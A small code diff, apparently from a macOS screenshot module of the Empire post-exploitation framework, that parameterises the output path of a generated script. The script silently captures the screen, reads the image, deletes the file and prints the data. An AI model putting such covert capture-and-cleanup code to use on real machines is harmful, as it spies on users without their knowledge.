@@ -73,7 +73,7 @@ class Module:
 
         script = """
 # take a screenshot using screencapture
-run_command('screencapture -x /tmp/out.png')
+run_command('screencapture -x %s')
 # base64 up resulting file, delete the file, return the base64 of the png output
 #   mocked from the Empire screenshot module
 f = open('%s', 'rb')
@@ -81,6 +81,6 @@ data = f.read()
 f.close()
 run_command('rm -f %s')
 print data
-""" % (savePath, savePath)
+""" % (savePath, savePath, savePath)
 
         return script
